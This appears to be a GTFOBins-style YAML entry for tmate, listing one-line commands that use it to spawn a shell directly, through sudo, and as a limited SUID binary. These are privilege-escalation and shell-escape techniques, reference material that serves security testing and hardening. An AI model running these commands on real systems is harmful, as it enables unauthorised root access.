---
functions:
  shell:
    - code: tmate -c /bin/sh
  sudo:
    - code: sudo tmate -c /bin/sh
  limited-suid:
    - code: ./tmate -c /bin/sh
---
